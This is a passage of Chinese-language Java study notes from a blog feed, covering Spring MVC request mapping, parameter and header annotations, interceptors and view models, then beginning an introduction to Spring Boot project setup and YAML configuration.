<h2 id="设置请求方法-method"><a href="#设置请求方法-method" class="headerlink" title="设置请求方法(method)"></a>设置请求方法(method)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">    value = &#123;&quot;/test&quot;, &quot;/test1&quot;&#125;,</span></span><br><span class="line"><span class="meta">    method = &#123;RequestMethod.GET, RequestMethod.POST&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;执行了测试方法&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="设置请求参数-params"><a href="#设置请求参数-params" class="headerlink" title="设置请求参数(params)"></a>设置请求参数(params)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;param&quot;</span>：要求请求映射所匹配的请求必须携带param请求参数</span><br><span class="line"><span class="string">&quot;!param&quot;</span>：要求请求映射所匹配的请求必须不能携带param请求参数</span><br><span class="line"><span class="string">&quot;param=value&quot;</span>：要求请求映射所匹配的请求必须携带param请求参数且param=value</span><br><span class="line"><span class="string">&quot;param!=value&quot;</span>：要求请求映射所匹配的请求必须携带param请求参数但是param!=value</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">    value = &#123;&quot;/test&quot;, &quot;/test1&quot;&#125;,</span></span><br><span class="line"><span class="meta">    method = &#123;RequestMethod.GET, RequestMethod.POST&#125;,</span></span><br><span class="line"><span class="meta">    params = &#123;&quot;username&quot;, &quot;password&quot;&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;执行了测试方法&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数绑定：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">    value = &#123;&quot;/test&quot;, &quot;/test1&quot;&#125;,</span></span><br><span class="line"><span class="meta">    method = &#123;RequestMethod.GET, RequestMethod.POST&#125;,</span></span><br><span class="line"><span class="meta">    params = &#123;&quot;username&quot;, &quot;password&quot;&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(String username, String password)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;username&quot;</span>+username);</span><br><span class="line">    System.out.println(<span class="string">&quot;password&quot;</span>+password);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数可绑定实体类，需要构建一个含有username和password的实体类，传入的参数是实体类参数即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">    value = &#123;&quot;/test&quot;, &quot;/test1&quot;&#125;,</span></span><br><span class="line"><span class="meta">    method = &#123;RequestMethod.GET, RequestMethod.POST&#125;,</span></span><br><span class="line"><span class="meta">    params = &#123;&quot;username&quot;, &quot;password&quot;&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(Person person)</span> &#123;</span><br><span class="line">    System.out.println(person);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;header&quot;</span>：要求请求映射所匹配的请求必须携带header请求头信息</span><br><span class="line"><span class="string">&quot;!header&quot;</span>：要求请求映射所匹配的请求必须不能携带header请求头信息</span><br><span class="line"><span class="string">&quot;header=value&quot;</span>：要求请求映射所匹配的请求必须携带header请求头信息且header=value</span><br><span class="line"><span class="string">&quot;header!=value&quot;</span>：要求请求映射所匹配的请求必须携带header请求头信息且header!=value</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://www.cnblogs.com/nice0e3/p/13602381.html">Java学习之Spring MVC入门 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
<h1 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h1><h2 id="RequestParam"><a href="#RequestParam" class="headerlink" title="@RequestParam"></a>@RequestParam</h2><p>三个属性：</p>
<ul>
<li><p><code>value</code>：指定为形参赋值的请求参数的参数名</p>
</li>
<li><p><code>required</code>：设置是否必须传输此请求参数，默认值为true</p>
<ul>
<li><p>值为<code>true</code>时，则当前请求必须传输value所指定的参数名，若没有传输该请求参数，且没有设置<code>defaultValue</code>属性，则页面报错</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">400</span>：Required String parameter <span class="string">&#x27;xxx&#x27;</span> is not present；</span><br></pre></td></tr></table></figure>
</li>
<li><p>值为<code>false</code>，则当前请求不是必须传输value所指定的请求参数。若没有传，则注解所标识的形参的值为<code>null</code></p>
</li>
</ul>
</li>
<li><p><code>defaultValue</code>：不管required属性值为true或false，当value所指定的请求参数没有传输或传输的值为空<code>&quot;&quot;</code>时，则使用默认值为形参赋值</p>
</li>
</ul>
<p>例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// RequestParam注解</span></span><br><span class="line"><span class="meta">@RequestMapping(path=&quot;/testRequestParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestParam</span><span class="params">(<span class="meta">@RequestParam(value = &quot;username&quot;, required = false)</span> String username,</span></span><br><span class="line"><span class="params">                               <span class="meta">@RequestParam(value = &quot;password&quot;, required = false)</span> String password)</span></span><br><span class="line">&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;username&quot;</span>+username);</span><br><span class="line">    System.out.println(<span class="string">&quot;password&quot;</span>+password);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PathVariable"><a href="#PathVariable" class="headerlink" title="@PathVariable"></a>@PathVariable</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(path=&quot;/testPathVariable/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testPathVariable</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> String id)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;id&quot;</span>+id);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="RequestBody"><a href="#RequestBody" class="headerlink" title="@RequestBody"></a>@RequestBody</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(path=&quot;/testRequestBody&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestBody</span><span class="params">(<span class="meta">@RequestBody</span> String body)</span> &#123;</span><br><span class="line">    System.out.println(body);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用于获取post请求的请求体内容</p>
<h2 id="RequestHeader"><a href="#RequestHeader" class="headerlink" title="@RequestHeader"></a>@RequestHeader</h2><p>共有三个属性：<code>value、required、defaultValue</code>，用法同@RequestParam</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(path = &quot;/testRequestHeader&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestHeader</span><span class="params">(<span class="meta">@RequestHeader(value = &quot;Host&quot;)</span> String host,</span></span><br><span class="line"><span class="params">                                <span class="meta">@RequestHeader(value = &quot;Accept-Encoding&quot;)</span> String code)</span> &#123;</span><br><span class="line">    System.out.println(host+<span class="string">&quot;....&quot;</span>+code);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CookieValue"><a href="#CookieValue" class="headerlink" title="@CookieValue"></a>@CookieValue</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(path=&quot;/testCookieValue&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testCookieValue</span><span class="params">(<span class="meta">@CookieValue(value = &quot;JSESSIONID&quot;)</span> String cookie)</span> &#123;</span><br><span class="line">    System.out.println(cookie);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用于获取指定cookie的名称的值</p>
<p>参考<a href="https://juejin.cn/post/6844903950844428301">Spring入门(十三)：Spring MVC常用注解讲解 - 掘金 (juejin.cn)</a></p>
<h1 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>拦截器和过滤器类似，但存在区别：</p>
<ul>
<li>过滤器在任何框架都可以使用，而拦截器是Spring MVC独有的</li>
<li>过滤器配置&#x2F; * 拦截所有资源，所有静态资源都会被拦截，而拦截器只会拦截控制器的方法</li>
</ul>
<h2 id="自定义拦截器"><a href="#自定义拦截器" class="headerlink" title="自定义拦截器"></a>自定义拦截器</h2><p>自定义拦截器必须实现HandlerInterceptor接口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. preHandle方法是controller方法执行前拦截的方法</span><br><span class="line">    1.1 可以使用request或者response跳转到指定的页面</span><br><span class="line">    1.2 <span class="built_in">return</span> <span class="literal">true</span>放行，执行下一个拦截器，如果没有拦截器，执行controller中的方法。</span><br><span class="line">    1.3. <span class="built_in">return</span> <span class="literal">false</span>不放行，不会执行controller中的方法。</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">2. postHandle是controller方法执行后执行的方法，在JSP视图执行前。</span><br><span class="line">    2.1 可以使用request或者response跳转到指定的页面</span><br><span class="line">    2.2 如果指定了跳转的页面，那么controller方法跳转的页面将不会显示。</span><br><span class="line">    </span><br><span class="line">3.afterCompletion方法是在JSP执行后执行</span><br><span class="line">    3.1 request或者response不能再跳转页面了</span><br></pre></td></tr></table></figure>

<h2 id="preHandle方法"><a href="#preHandle方法" class="headerlink" title="preHandle方法"></a>preHandle方法</h2><p>重写HandlerInterceptor接口中的preHandler方法，会在执行控制器方法之前执行该方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了拦截方法&quot;</span>);</span><br><span class="line">        request.getRequestDispatcher(<span class="string">&quot;/WEB-INF/error.jsp&quot;</span>).forward(request,response);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把自定义拦截器加入到spring mvc.xml的配置文件中</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 拦截器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 配置拦截路径 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/home/*&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 注入自定义拦截器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.learn.web.MyInterceptor&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="postHandle方法"><a href="#postHandle方法" class="headerlink" title="postHandle方法"></a>postHandle方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;执行了拦截方法&quot;</span>);</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/WEB-INF/error.jsp&quot;</span>).forward(request,response);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;控制器执行后执行&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在控制器方法执行之后执行</p>
<h2 id="afterCompletion方法"><a href="#afterCompletion方法" class="headerlink" title="afterCompletion方法"></a>afterCompletion方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;执行了拦截方法&quot;</span>);</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/WEB-INF/error.jsp&quot;</span>).forward(request,response);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;控制器执行后执行&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;jsp页面执行后执行&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在jsp执行之后执行</p>
<h2 id="配置多个拦截器"><a href="#配置多个拦截器" class="headerlink" title="配置多个拦截器"></a>配置多个拦截器</h2><p>只需要在spring mvc的配置文件中添加&lt;mvc:interceptor&gt;</p>
<p>参考：<a href="https://www.cnblogs.com/nice0e3/p/13614313.html">Java学习之SpringMVC 拦截器 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
<h1 id="Spring-MVC-Model向View传递值"><a href="#Spring-MVC-Model向View传递值" class="headerlink" title="Spring MVC Model向View传递值"></a>Spring MVC Model向View传递值</h1><p>控制器方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/login&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">login</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;执行登录方法&quot;</span>);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;springmvc&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>login.jsp:</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    登录界面</span><br><span class="line">    username:$&#123;username&#125;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/&quot;</span>&gt;首页&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/ruoli-0/p/14020252.html">Spring MVC——项目的开发流程 - 城北有个混子 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/birdy-silhouette/p/15530825.html">springmvc学习笔记（全） - 至安 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://xz.aliyun.com/t/10590">Spring MVC框架安全浅析 - 先知社区 (aliyun.com)</a></p>
]]></content>
      <categories>
        <category>Java基础</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础之SpringBoot框架</title>
    <url>/2022/12/04/Springboot/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Spring缺点：</p>
<ul>
<li>配置繁琐</li>
<li>依赖繁琐</li>
</ul>
<p>SpringBoot功能</p>
<ul>
<li>自动配置</li>
<li>起步依赖<br>本质上是一个Maven项目对象模型（POM），定义了对其他库的传递依赖</li>
<li>辅助功能<br>嵌入式服务器、安全、指标、健康检测、外部配置等</li>
</ul>
<p><strong>SpringBoot不是对Spring功能上的增强，而是提供了一种快速使用Spring的方式</strong></p>
<h1 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h1><p>简单搭建一个springboot-hello工程，步骤如下：</p>
<ul>
<li>创建Maven项目</li>
<li>导入SpringBoot起步依赖</li>
<li>定义Controller</li>
<li>编写引导类</li>
<li>启动测试</li>
</ul>
<p>按照上面的步骤创建Maven工程，在pom.xml中添加相关依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- springboot工程需要继承的父工程 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Add typical dependencies for a web application --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>创建HelloController</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, SpringBoot!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建启动类HelloApplication（启动类一般以Application结尾）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(HelloApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于SpringBoot中内置服务器，查看运行日志找到服务开放的对应端口访问即可<br>这里是Tomcat开放的8080端口，输入<a href="http://127.0.0.1:8080/hello%E5%8D%B3%E5%8F%AF%E8%BF%9B%E8%A1%8C%E5%AD%97%E7%AC%A6%E7%9A%84%E6%89%93%E5%8D%B0">http://127.0.0.1:8080/hello即可进行字符的打印</a><br>参考：<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/getting-started.html">https://docs.spring.io/spring-boot/docs/current/reference/html/getting-started.html</a></p>
<p>总结：</p>
<ul>
<li>SpringBoot在创建项目时，使用jar的打包方式</li>
<li>SpringBoot的引导类，是项目入口，运行main方法即可启动项目</li>
<li>使用SpringBoot和Spring构建项目，业务代码编写方式完全一样</li>
</ul>
<h1 id="快速构建SpringBoot工程"><a href="#快速构建SpringBoot工程" class="headerlink" title="快速构建SpringBoot工程"></a>快速构建SpringBoot工程</h1><p>在IDEA中新建模块<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230911153943.png"><br>选择SpringBoot版本和需要的组件依赖<br><img src="/java-img/20230911153421.png"><br>此时初始化的项目已经配置好了pom.xml和引导类，只需要写Controller即可启动运行</p>
<h1 id="SpringBoot配置"><a href="#SpringBoot配置" class="headerlink" title="SpringBoot配置"></a>SpringBoot配置</h1><p><strong>配置文件分类</strong>：<br>SpringBoot是基于约定的，可以使用application.properties或者application.yml（application.yaml）进行配置</p>
<ul>
<li><p>properties<br><code>server.port=8080</code></p>
</li>
<li><p>yml</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>默认配置文件名称：application<br>在同一目录下的优先级：application.properties &gt; application.yml &gt; application.yaml</p>
<p><strong>YAML基本语法</strong>：</p>
<ul>
<li>大小写敏感</li>
<li>数据值前面必须有空格作为分隔符</li>
<li>使用缩进表示层级关系</li>
<li>缩进时不允许使用Tab键，只允许使用空格</li>
<li>缩进的空格数目不重要，只要相同层级的元素左侧对其即可</li>
<li>#表示注释，从这一个字符一直到行尾，都会被解析器所忽略</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">    <span class="attr">address:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">name:</span> <span class="string">abc</span></span><br></pre></td></tr></table></figure>

<p><strong>YAML数据格式</strong>:</p>
<ul>
<li><p>对象（map）：键值对的集合</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">zhansan</span></span><br><span class="line"><span class="comment">#行内写法</span></span><br><span class="line"><span class="attr">person:</span> &#123;<span class="attr">name:</span> <span class="string">zhansan</span>&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>数组：一组按次序排列的值</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">address:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">beijing</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">shanghai</span></span><br><span class="line"><span class="comment">#行内写法</span></span><br><span class="line"><span class="attr">address:</span> [<span class="string">beijing</span>,<span class="string">shanghai</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p>纯量：单个的、不可再分的值</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">msg1:</span> <span class="string">&#x27;hello \n world&#x27;</span> <span class="comment">#单引号忽略转义字符</span></span><br><span class="line"><span class="attr">msg2:</span> <span class="string">&quot;hello \n world&quot;</span> <span class="comment">#双引号识别转义字符</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>YAML参数引用</strong>：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">lisi</span></span><br><span class="line"></span><br><span class="line"><span class="attr">person:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">$&#123;name&#125;</span> <span class="comment"># 引用上面定义的name值</span></span><br></pre></td></tr></table></figure>

<p><strong>获取配置数据</strong>：</p>
<ul>
<li>@Value</li>
<li>Environment</li>
<li>@ConfigurationProperties</li>
</ul>
<p>a. @Value取值<br>application.yml中数据如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">zhangshan</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Person:</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">lisi</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">18</span></span><br></pre></td></tr></table></figure>

<p>HelloController中代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springbootinit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;Person.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;Person.age&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name:&quot;</span> + name);</span><br><span class="line">        System.out.println(<span class="string">&quot;username:&quot;</span> + username);</span><br><span class="line">        System.out.println(<span class="string">&quot;age:&quot;</span> + age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello, springboot!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就能成功取到application.yml中的值了</p>
<p>b. Environment<br>application.yml中的内容还是同上，HelloController的内容如下：</p>
